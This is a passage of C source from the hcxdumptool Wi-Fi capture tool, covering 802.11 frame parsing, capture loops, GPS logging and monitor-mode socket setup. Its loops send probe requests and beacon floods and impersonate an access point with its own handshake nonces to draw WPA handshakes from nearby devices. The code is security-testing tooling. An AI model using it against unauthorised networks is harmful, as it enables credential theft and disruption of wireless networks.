static const char *gpgga = "$GPGGA";
static const char *gprmc = "$GPRMC";

nmeatemplen = read(fd_gps, nmeatempsentence, NMEA_MAX -1);
if(nmeatemplen < 44) return;
nmeatempsentence[nmeatemplen] = 0;
nmeaptr = strstr(nmeatempsentence, gpgga);
if(nmeaptr == NULL) nmeaptr = strstr(nmeatempsentence, gprmc);
if(nmeaptr == NULL) return;
nmealen = 0;
while((nmeaptr[nmealen] != 0x0) && ( nmeaptr[nmealen] != 0x0a) && ( nmeaptr[nmealen] != 0xd)) nmealen++;
nmeaptr[nmealen] = 0;
memcpy(&nmeasentence,  nmeaptr, nmealen +1); 
if(fd_pcapng > 0) writecbnmea(fd_pcapng);
if(fh_nmea != NULL) fprintf(fh_nmea, "%s\n", nmeasentence);
gpscount++;
return;
}
/*===========================================================================*/
static inline void process_packet()
{
static uint32_t rthl;

packetlen = read(fd_socket, epb +EPB_SIZE, PCAPNG_MAXSNAPLEN);
if(packetlen == 0)
	{
	fprintf(stderr, "\ninterface went down\n");
	globalclose();
	}
if(packetlen < 0)
	{
	perror("\nfailed to read packet");
	errorcount++;
	return;
	}
#ifdef DEBUG
debugprint(packetlen, &epb[EPB_SIZE]);
#endif
if(packetlen < (int)RTH_SIZE)
	{
	fprintf(stderr, "\ngot damged radiotap header\n");
	errorcount++;
	return;
	}
if(ioctl(fd_socket, SIOCGSTAMP, &tv) < 0)
	{
	perror("\nfailed to get time stamp");
	errorcount++;
	return;
	}
timestamp = ((uint64_t)tv.tv_sec *1000000) + tv.tv_usec;
incommingcount++;
packetptr = &epb[EPB_SIZE];
rth = (rth_t*)packetptr;
if(rth->it_version != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_pad != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_present == 0)
	{
	errorcount++;
	return;
	}
rthl = le16toh(rth->it_len);
if(rthl <= 14) return; /* outgoing packet */
ieee82011ptr = packetptr +rthl;
ieee82011len = packetlen -rthl;
if(((le32toh(rth->it_present) &0x80000003) == 0x80000003) && ((packetptr[0x18] &0x10) == 0x10)) ieee82011len -= 4; /* Atheros FCS quick and dirty */
if(ieee82011len < (int)MAC_SIZE_ACK) return;
macfrx = (mac_t*)ieee82011ptr;
if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
	{
	payloadptr = ieee82011ptr +MAC_SIZE_LONG;
	payloadlen = ieee82011len -MAC_SIZE_LONG;
	}
else
	{
	payloadptr = ieee82011ptr +MAC_SIZE_NORM;
	payloadlen = ieee82011len -MAC_SIZE_NORM;
	}
if(macfrx->type == IEEE80211_FTYPE_CTL)
	{
	if(macfrx->subtype == IEEE80211_STYPE_ACK)
		{
		memcpy(&mac_ack, macfrx->addr1, 6);
		return;
		}
	}
if(ieee82011len < (int)MAC_SIZE_NORM) return;
if(macfrx->type == IEEE80211_FTYPE_MGMT)
	{
	if(macfrx->subtype == IEEE80211_STYPE_BEACON)
		{
		process80211beacon();
		if(beaconfloodflag == true) send_beacon_aplist();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_REQ)
		{
		if(memcmp(macfrx->addr1, &mac_broadcast, 6) == 0) process80211probe_req();
		else process80211probe_req_directed();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211probe_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_AUTH)
		{
		if(memcmp(macfrx->addr1, macfrx->addr3, 6) == 0) process80211authentication_req();
		else if(memcmp(macfrx->addr2, macfrx->addr3, 6) == 0) process80211authentication_resp();
		else process80211authentication_unknown();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_REQ) process80211association_req();
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_RESP) process80211association_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_REQ) process80211reassociation_req();
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_RESP) process80211reassociation_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_ACTION) process80211action();
	else return;
	}
else if(macfrx->type == IEEE80211_FTYPE_CTL)
	{
	if(macfrx->subtype == IEEE80211_STYPE_PSPOLL) process80211powersave_poll();
	}
else if(macfrx->type == IEEE80211_FTYPE_DATA)
	{
	if(((macfrx->subtype &IEEE80211_STYPE_NULLFUNC) == IEEE80211_STYPE_NULLFUNC) || ((macfrx->subtype &IEEE80211_STYPE_QOS_NULLFUNC) == IEEE80211_STYPE_QOS_NULLFUNC))
		{
		process80211null();
		return;
		}
	qosflag = false;
	if((macfrx->subtype &IEEE80211_STYPE_QOS_DATA) == IEEE80211_STYPE_QOS_DATA)
		{
		qosflag = true;
		payloadptr += QOS_SIZE;
		payloadlen -= QOS_SIZE;
		}
	if(payloadlen < (int)LLC_SIZE) return;
	llcptr = payloadptr;
	llc = (llc_t*)llcptr;
	if(((ntohs(llc->type)) == LLC_TYPE_AUTH) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		process80211eap();
		}
	else if(((ntohs(llc->type)) == LLC_TYPE_IPV4) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		if((pcapngframesout &PCAPNG_FRAME_IPV4) == PCAPNG_FRAME_IPV4)
			{
			if(fd_pcapng <= 0) return;
			if((pcapngframesout &PCAPNG_FRAME_IPV4) != PCAPNG_FRAME_IPV4) return;
			writeepb(fd_pcapng);
			}
		}
	else if(((ntohs(llc->type)) == LLC_TYPE_IPV6) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
		{
		if((pcapngframesout &PCAPNG_FRAME_IPV6) == PCAPNG_FRAME_IPV6)
			{
			if(fd_pcapng <= 0) return;
			if((pcapngframesout &PCAPNG_FRAME_IPV6) != PCAPNG_FRAME_IPV6) return;
			writeepb(fd_pcapng);
			}
		}
	else if(macfrx->prot ==1)
		{
		mpduptr = payloadptr;
		mpdu = (mpdu_t*)mpduptr;
		if(((mpdu->keyid >> 5) &1) == 1) process80211data_wpa();
		else if(((mpdu->keyid >> 5) &1) == 0) process80211data_wep();
		}
	}
return;
}
/*===========================================================================*/
static inline void process_fd()
{
static uint64_t incommingcountold;
static int sd;
static int fdnum;
static fd_set readfds;
static struct timeval tvfd;

snprintf(servermsg, SERVERMSG_MAX, "\e[?25l\nstart capturing (stop with ctrl+c)\n"
	"NMEA 0183 SENTENCE......: %s\n"
	"INTERFACE NAME..........: %s\n"
	"INTERFACE HARDWARE MAC..: %02x%02x%02x%02x%02x%02x\n"
	"DRIVER..................: %s\n"
	"DRIVER VERSION..........: %s\n"
	"DRIVER FIRMWARE VERSION.: %s\n"
	"ERRORMAX................: %d errors\n"
	"FILTERLIST ACCESS POINT.: %d entries\n"
	"FILTERLIST CLIENT.......: %d entries\n"
	"FILTERMODE..............: %d\n"
	"WEAK CANDIDATE..........: %s\n"
	"PREDEFINED ACCESS POINT.: %d entries\n"
	"MAC ACCESS POINT........: %02x%02x%02x%02x%02x%02x (incremented on every new client)\n"
	"MAC CLIENT..............: %02x%02x%02x%02x%02x%02x\n"
	"REPLAYCOUNT.............: %"  PRIu64  "\n"
	"ANONCE..................: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n"
	"SNONCE..................: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n"
	"\n",
	nmeasentence, interfacename, mac_orig[0], mac_orig[1], mac_orig[2], mac_orig[3], mac_orig[4], mac_orig[5],
	drivername, driverversion, driverfwversion, 
	maxerrorcount, filteraplistentries, filterclientlistentries, filtermode, weakcandidate,
	beaconextlistlen,
	mac_myap[0], mac_myap[1], mac_myap[2], mac_myap[3], mac_myap[4], mac_myap[5],
	mac_myclient[0], mac_myclient[1], mac_myclient[2], mac_myclient[3], mac_myclient[4], mac_myclient[5],
	myrc,
	myanonce[0], myanonce[1], myanonce[2], myanonce[3], myanonce[4], myanonce[5], myanonce[6], myanonce[7],
	myanonce[8], myanonce[9], myanonce[10], myanonce[11], myanonce[12], myanonce[13], myanonce[14], myanonce[15],
	myanonce[16], myanonce[17], myanonce[18], myanonce[19], myanonce[20], myanonce[21], myanonce[22], myanonce[23],
	myanonce[24], myanonce[25], myanonce[26], myanonce[27], myanonce[28], myanonce[29], myanonce[30], myanonce[31],
	mysnonce[0], mysnonce[1], mysnonce[2], mysnonce[3], mysnonce[4], mysnonce[5], mysnonce[6], mysnonce[7],
	mysnonce[8], mysnonce[9], mysnonce[10], mysnonce[11], mysnonce[12], mysnonce[13], mysnonce[14], mysnonce[15],
	mysnonce[16], mysnonce[17], mysnonce[18], mysnonce[19], mysnonce[20], mysnonce[21], mysnonce[22], mysnonce[23],
	mysnonce[24], mysnonce[25], mysnonce[26], mysnonce[27], mysnonce[28], mysnonce[29], mysnonce[30], mysnonce[31]);

if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) sendto(fd_socket_mcsrv, servermsg, strlen(servermsg), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress));
else printf("%s", servermsg);

incommingcountold = 0;
gettimeofday(&tv, NULL);
tvfd.tv_sec = 0;
tvfd.tv_usec = 250000;
cpa = 0;
if(set_channel() == false) errorcount++;
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
while(1)
	{
	gettimeofday(&tv, NULL);
	if(tv.tv_sec != tvold.tv_sec)
		{
		tvold.tv_sec = tv.tv_sec;
		if(tv.tv_sec >= tvtot.tv_sec)
			{
			totflag = true;
			globalclose();
			}
		if((tv.tv_sec %5) == 0) 
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				if(incommingcountold == incommingcount)
					{
					nanosleep(&sleepled, NULL);
					GPIO_SET = 1 << gpiostatusled;
					nanosleep(&sleepled, NULL);
					GPIO_CLR = 1 << gpiostatusled;
					}
				}
			incommingcountold = incommingcount;
			}
		if((tv.tv_sec %staytime) == 0) 
			{
			cpa++;
			if(channelscanlist[cpa] == 0) cpa = 0;
			if(set_channel() == false)
				{
				errorcount++;
				continue;
				}
			if(beaconactiveflag == true) send_beacon_aplist();
			if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
			}
		if((tv.tv_sec %60) == 0) 
			{
			if(((statusout &STATUS_GPS) == STATUS_GPS) && (fd_gps > 0)) printposition();
			if((statusout &STATUS_INTERNAL) == STATUS_INTERNAL) printtimestatus();	
			}
		}
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	if(wantstopflag == true) globalclose();
	if(errorcount >= maxerrorcount)
		{
		fprintf(stderr, "\nmaximum number of errors is reached\n");
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	sd = fd_socket;
	if(fd_gps > 0)
		{
		FD_SET(fd_gps, &readfds);
		sd = fd_gps;
		}
	fdnum = select(sd +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds)) process_gps();
	else if(FD_ISSET(fd_socket, &readfds)) process_packet();
	else
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
			{
			cpa++;
			if(channelscanlist[cpa] == 0) cpa = 0;
			if(set_channel() == false)
				{
				errorcount++;
				continue;
				}
			send_proberequest_undirected_broadcast();
			if(beaconactiveflag == true) send_beacon_aplist();
			}
		tvfd.tv_sec = 0;
		tvfd.tv_usec = 250000;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211probe_resp_rca_scan()
{
static int apinfolen;
static uint8_t *apinfoptr;
static scanlist_t *zeiger;

static tags_t tags;

if(payloadlen < (int)CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX -1; zeiger++)
	{
	if(zeiger->count == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count +=1;
	if(memcmp(macfrx->addr1, &mac_myclient, 6) == 0) zeiger->counthit += 1;
	gettags(apinfolen, apinfoptr, &tags);
	zeiger->essidlen = tags.essidlen;
	memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
	return;
	}
gettags(apinfolen, apinfoptr, &tags);
memset(zeiger, 0, SCANLIST_SIZE);
zeiger->timestamp = timestamp;
if(memcmp(macfrx->addr1, &mac_myclient, 6) == 0) zeiger->counthit = 1;
zeiger->count = 1;
memcpy(zeiger->addr, macfrx->addr2, 6);
zeiger->channel = tags.channel;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
qsort(scanlist, zeiger -scanlist, SCANLIST_SIZE, sort_scanlist_by_count);
return;
}
/*===========================================================================*/
static inline void process80211beacon_rca_scan()
{
static int apinfolen;
static uint8_t *apinfoptr;
static scanlist_t *zeiger;

static tags_t tags;

if(payloadlen < (int)CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = scanlist; zeiger < scanlist +SCANLIST_MAX -1; zeiger++)
	{
	if(zeiger->count == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) 
		{
		if((zeiger->count %10) == 0) send_proberequest_directed_broadcast(zeiger->essidlen, zeiger->essid);
		}
	return;
	}
gettags(apinfolen, apinfoptr, &tags);
memset(zeiger, 0, SCANLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->count = 1;
memcpy(zeiger->addr, macfrx->addr2, 6);
zeiger->channel = tags.channel;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_directed_broadcast(zeiger->essidlen, zeiger->essid);
qsort(scanlist, zeiger -scanlist, SCANLIST_SIZE, sort_scanlist_by_count);
return;
}
/*===========================================================================*/
static inline void process_packet_rca()
{
static uint32_t rthl;

packetlen = read(fd_socket, epb +EPB_SIZE, PCAPNG_MAXSNAPLEN);
if(packetlen == 0)
	{
	fprintf(stderr, "\ninterface went down\n");
	globalclose();
	}
if(packetlen < 0)
	{
	perror("\nfailed to read packet");
	errorcount++;
	return;
	}
#ifdef DEBUG
debugprint(packetlen, &epb[EPB_SIZE]);
#endif
if(packetlen < (int)RTH_SIZE)
	{
	fprintf(stderr, "\ngot damged radiotap header\n");
	errorcount++;
	return;
	}
if(ioctl(fd_socket, SIOCGSTAMP, &tv) < 0)
	{
	perror("\nfailed to get time stamp");
	errorcount++;
	return;
	}
timestamp = ((uint64_t)tv.tv_sec *1000000) + tv.tv_usec;
incommingcount++;
packetptr = &epb[EPB_SIZE];
rth = (rth_t*)packetptr;
if(rth->it_version != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_pad != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_present == 0)
	{
	errorcount++;
	return;
	}
rthl = le16toh(rth->it_len);
if(rthl <= 14) return; /* outgoing packet */
ieee82011ptr = packetptr +rthl;
ieee82011len = packetlen -rthl;
if(((le32toh(rth->it_present) &0x80000003) == 0x80000003) && ((packetptr[0x18] &0x10) == 0x10)) ieee82011len -= 4; /* Atheros FCS quick and dirty */
if(ieee82011len < (int)MAC_SIZE_ACK) return;
macfrx = (mac_t*)ieee82011ptr;
if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
	{
	payloadptr = ieee82011ptr +MAC_SIZE_LONG;
	payloadlen = ieee82011len -MAC_SIZE_LONG;
	}
else
	{
	payloadptr = ieee82011ptr +MAC_SIZE_NORM;
	payloadlen = ieee82011len -MAC_SIZE_NORM;
	}
if(macfrx->type == IEEE80211_FTYPE_MGMT)
	{
	if(macfrx->subtype == IEEE80211_STYPE_BEACON) process80211beacon_rca_scan();
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211probe_resp_rca_scan();
	}
if(fd_pcapng > 0) writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process_fd_rca()
{
static uint64_t incommingcountold;
static int sd;
static int fdnum;
static fd_set readfds;
static struct timeval tvfd;

gettimeofday(&tv, NULL);
tvold.tv_sec = tv.tv_sec;
tvold.tv_usec = tv.tv_usec;
tvfd.tv_sec = 0;
tvfd.tv_usec = 100000;
cpa = 0;
if(set_channel() == false) errorcount++;
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
printrcascan();
while(1)
	{
	gettimeofday(&tv, NULL);
	if(tv.tv_sec != tvold.tv_sec)
		{
		cpa++;
		if(channelscanlist[cpa] == 0) cpa = 0;
		if(set_channel() == false)
			{
			errorcount++;
			continue;
			}
		tvold.tv_sec = tv.tv_sec;
		if(tv.tv_sec >= tvtot.tv_sec)
			{
			totflag = true;
			globalclose();
			}
		if((tv.tv_sec %5) == 0) 
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				if(incommingcountold == incommingcount)
					{
					nanosleep(&sleepled, NULL);
					GPIO_SET = 1 << gpiostatusled;
					nanosleep(&sleepled, NULL);
					GPIO_CLR = 1 << gpiostatusled;
					}
				}
			incommingcountold = incommingcount;
			}
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		printrcascan();
		}
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	if(wantstopflag == true) globalclose();
	if(errorcount >= maxerrorcount)
		{
		fprintf(stderr, "\nmaximum number of errors is reached\n");
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	sd = fd_socket;
	if(fd_gps > 0)
		{
		FD_SET(fd_gps, &readfds);
		sd = fd_gps;
		}
	fdnum = select(sd +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds)) process_gps();
	else if(FD_ISSET(fd_socket, &readfds)) process_packet_rca();
	else
		{
		cpa++;
		if(channelscanlist[cpa] == 0) cpa = 0;
		if(set_channel() == false)
			{
			errorcount++;
			continue;
			}
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_undirected_broadcast();
		tvfd.tv_sec = 0;
		tvfd.tv_usec = 100000;
		}
	}
return;
}
/*===========================================================================*/
static inline void process_server()
{
static fd_set readfds;
static struct timeval tvfd;
static int fdnum;
static int msglen;
static uint32_t statuscount;

static char serverstatus[SERVERSTATUS_MAX];

printf("waiting for hcxdumptool server...\n");
gettimeofday(&tv, NULL);
timestampstart = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec;
timestamp = timestampstart;
wantstopflag = false;
signal(SIGINT, programmende);
statuscount = 1;
tvfd.tv_sec = 1;
tvfd.tv_usec = 0;
while(1)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0)
			{
			globalclose();
			}
		}
	if(wantstopflag == true)
		{
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket_mccli, &readfds);
	fdnum = select(fd_socket_mccli +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_socket_mccli, &readfds))
		{
		msglen = read(fd_socket_mccli, serverstatus, SERVERSTATUS_MAX);
		if(msglen < 0)
			{
			perror("\nfailed to read data from server");
			continue;
			}
		serverstatus[msglen] = 0;
		printf("%s", serverstatus);
		}
	else
		{
		if((statuscount %5) == 0)
			{
			if(gpiostatusled > 0)
				{
				GPIO_SET = 1 << gpiostatusled;
				nanosleep(&sleepled, NULL);
				GPIO_CLR = 1 << gpiostatusled;
				}
			}
		statuscount++;
		tvfd.tv_sec = 1;
		tvfd.tv_usec = 0;
		}
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline bool checkmonitorinterface(char *checkinterfacename)
{
static const char *monstr = "mon";

if(checkinterfacename == NULL) return true;
if(strstr(checkinterfacename, monstr) == NULL) return false;
return true;
}
/*===========================================================================*/
static inline void checkunwanted(const char *unwantedname)
{
static FILE *fp;
static char pidline[1024];
static char *pidptr = NULL;

memset(&pidline, 0, 1024);
fp = popen(unwantedname,"r");
if(fp)
	{
	pidptr = fgets(pidline, 1024, fp);
	if(pidptr != NULL) fprintf(stderr, "warning: %s is running with pid %s (service possbile interfering hcxdumptool)\n", &unwantedname[6], pidline);
	pclose(fp);
	}
return;
}
/*===========================================================================*/
static inline void checkallunwanted()
{
static const char *networkmanager = "pidof NetworkManager";
static const char *wpasupplicant = "pidof wpa_supplicant";

checkunwanted(networkmanager);
checkunwanted(wpasupplicant);
return;
}
/*===========================================================================*/
static bool openmcclisocket(int mccliport)
{
static int loop;
static struct sockaddr_in mccliaddress;

fd_socket_mccli = 0;
if((fd_socket_mccli = socket(PF_INET, SOCK_DGRAM, 0)) < 0)
	{
	perror ("client socket failed");
	return false;
	}

memset (&mccliaddress, 0, sizeof(mccliaddress));
mccliaddress.sin_family = AF_INET;
mccliaddress.sin_addr.s_addr = htonl(INADDR_ANY);
mccliaddress.sin_port = htons(mccliport);
loop = 1;
if(setsockopt(fd_socket_mccli, SOL_SOCKET, SO_REUSEADDR, &loop, sizeof (loop)) < 0)
	{
	perror("setsockopt() SO_REUSEADDR failed");
	return false;
	}
if(bind(fd_socket_mccli, (struct sockaddr*)&mccliaddress, sizeof(mccliaddress)) < 0)
	{
	perror ("bind client failed");
	return false;
	}
loop = 1;
if (setsockopt(fd_socket_mccli, IPPROTO_IP, IP_MULTICAST_LOOP, &loop, sizeof (loop)) < 0)
	{
	perror ("setsockopt() IP_MULTICAST_LOOP failed");
	return false;
	}

memset(&mcmreq, 0, sizeof(mcmreq));
mcmreq.imr_multiaddr.s_addr = inet_addr(MCHOST);
mcmreq.imr_interface.s_addr = htonl(INADDR_ANY);
if(setsockopt(fd_socket_mccli, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mcmreq, sizeof(mcmreq)) < 0)
	{
	perror ("setsockopt() IP_ADD_MEMBERSHIP failed");
	return false;
	}
return true;
}
/*===========================================================================*/
static inline bool openmcsrvsocket(int mcsrvport)
{
fd_socket_mcsrv = 0;
if((fd_socket_mcsrv = socket (AF_INET, SOCK_DGRAM, 0)) < 0) 
	{
	perror("server socket failed");
	return false;
	}

memset (&mcsrvaddress, 0, sizeof(mcsrvaddress));
mcsrvaddress.sin_family = AF_INET;
mcsrvaddress.sin_addr.s_addr = inet_addr (MCHOST);
mcsrvaddress.sin_port = htons(mcsrvport);
if(sendto(fd_socket_mcsrv, "hello hcxdumptool clients...\n", sizeof ("hello hcxdumptool clients...\n"), 0, (struct sockaddr*)&mcsrvaddress, sizeof(mcsrvaddress)) < 0)
	{
	perror("server socket failed");
	close(fd_socket_mcsrv);
	return false;
	}
return true;
}
/*===========================================================================*/
static inline void opengps()
{
static int havegps;
static struct sockaddr_in gpsd_addr;
static int fdnum;
static fd_set readfds;
static struct timeval tvfd;
static const char *nogps = "N/A";
static const char gpgga[] = "$GPGGA";
static const char gprmc[] = "$GPRMC";
static const char *gpsd_enable_nmea = "?WATCH={\"enable\":true,\"json\":false,\"nmea\":true}";

nmealen = 0;
memset(&nmeasentence, 0, NMEA_MAX);
memcpy(&nmeasentence, nogps, 3);
if(gpsname != NULL)
	{
	printf("connecting GPS device...\n");
	if((fd_gps = open(gpsname, O_RDONLY)) < 0)
		{
		perror( "failed to open GPS device");
		fprintf(stderr, "failed to open GPS device\n");
		fd_gps = 0;
		return;
		}
	}
if(gpsdflag == true)
	{
	if((fd_gps = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		{
		perror( "failed to open GPSD socket");
		fd_gps = 0;
		return;
		}
	printf("connecting GPSD...\n");
	memset(&gpsd_addr, 0, sizeof(struct sockaddr_in));
	gpsd_addr.sin_family = AF_INET;
	gpsd_addr.sin_port = htons(2947);
	gpsd_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	if(connect(fd_gps, (struct sockaddr*) &gpsd_addr, sizeof(gpsd_addr)) < 0)
		{
		perror("failed to connect to GPSD");
		fd_gps = 0;
		return;
		}
	if(write(fd_gps, gpsd_enable_nmea, 47) != 47)
		{
		perror("failed to activate GPSD WATCH");
		fd_gps = 0;
		return;
		}
	}

tvfd.tv_sec = 1;
tvfd.tv_usec = 0;
havegps = 0;
while(1)
	{
	if(gpiobutton > 0)
		{
		if(GET_GPIO(gpiobutton) > 0) globalclose();
		}
	if(wantstopflag == true)
		{
		globalclose();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_gps, &readfds);
	fdnum = select(fd_gps +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcount++;
		continue;
		}
	if(FD_ISSET(fd_gps, &readfds))
		{
		process_gps();
		if(memcmp(&gpgga, nmeasentence, 6) == 0) return;
		if(memcmp(&gprmc, nmeasentence, 6) == 0) return;
		if(havegps > 120) return;
		havegps++;
		}
	else
		{
		if(havegps > 120) return;
		havegps++;
		tvfd.tv_sec = 1;
		tvfd.tv_usec = 0;
		}
	}
return;
}
/*===========================================================================*/
static inline bool opensocket()
{
static struct ethtool_perm_addr *epmaddr;
static struct ifreq ifr;
static struct iwreq iwr;
static struct iw_param param;
static struct sockaddr_ll ll;
static struct packet_mreq mr;
static struct ethtool_drvinfo drvinfo;

fd_socket = 0;
memset(&mac_orig, 0, 6);
memset(&drivername, 0, 34);
memset(&driverversion, 0, 34);
memset(&driverfwversion, 0, 34);
checkallunwanted();
if(checkmonitorinterface(interfacename) == true) fprintf(stderr, "warning: %s is probably a monitor interface\n", interfacename);
if((fd_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	perror("socket failed (do you have root privileges?)");
	return false;
	}

memset(&ifr_old, 0, sizeof(ifr));
strncpy(ifr_old.ifr_name, interfacename, IFNAMSIZ -1);
if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr_old) < 0)
	{
	perror("failed to backup current interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
	return false;
	}

memset(&iwr_old, 0, sizeof(iwr));
strncpy(iwr_old.ifr_name, interfacename, IFNAMSIZ -1);
if(ioctl(fd_socket, SIOCGIWMODE, &iwr_old) < 0)
	{
	perror("failed to backup  current interface mode, ioctl(SIOCGIWMODE) not supported by driver");
	return false;
	}

if((iwr_old.u.mode & IW_MODE_MONITOR) != IW_MODE_MONITOR)
	{
	memset(&ifr, 0, sizeof(ifr));
	strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0)
		{
		perror("failed to get current interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
		return false;
		}
	ifr.ifr_flags = 0;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0)
		{
		perror("failed to set interface down, ioctl(SIOCSIFFLAGS) not supported by driver");
		return false;
		}

	memset(&iwr, 0, sizeof(iwr));
	strncpy( iwr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIWMODE, &iwr) < 0)
		{
		perror("failed to get interface information, ioctl(SIOCGIWMODE) not supported by driver");
		return false;
		}
	iwr.u.mode = IW_MODE_MONITOR;
	if(ioctl(fd_socket, SIOCSIWMODE, &iwr) < 0)
		{
		perror("failed to set monitor mode, ioctl(SIOCSIWMODE) not supported by driver");
		return false;
		}
	memset(&iwr, 0, sizeof(iwr));
	strncpy( iwr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIWMODE, &iwr) < 0)
		{
		perror("failed to get interface information, ioctl(SIOCGIWMODE) not supported by driver");
		return false;
		}
	if((iwr.u.mode & IW_MODE_MONITOR) != IW_MODE_MONITOR)
		{
		fprintf(stderr, "interface is not in monitor mode\n");
		return false;
		}

	ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
	if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0)
		{
		perror("failed to set interface up, ioctl(SIOCSIFFLAGS) not supported by driver");
		return false;
		}
	memset(&ifr, 0, sizeof(ifr));
	strncpy( ifr.ifr_name, interfacename, IFNAMSIZ -1);
	if(ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0)
		{
		perror("failed to get interface flags, ioctl(SIOCGIFFLAGS) not supported by driver");
		return false;
		}
	if((ifr.ifr_flags & (IFF_UP)) != (IFF_UP))
		{
		fprintf(stderr, "interface may not be operational\n");
		return false;
		}
	}
else fprintf(stderr, "interface is already in monitor mode\n");

/* disable power management, if possible */
memset(&iwr, 0, sizeof(iwr));
strncpy( iwr.ifr_name, interfacename, IFNAMSIZ -1);
memset(&param,0 , sizeof(param));
iwr.u.data.pointer = &param;
ioctl(fd_socket, SIOCSIWPOWER, &iwr);

memset(&ifr, 0, sizeof(ifr));
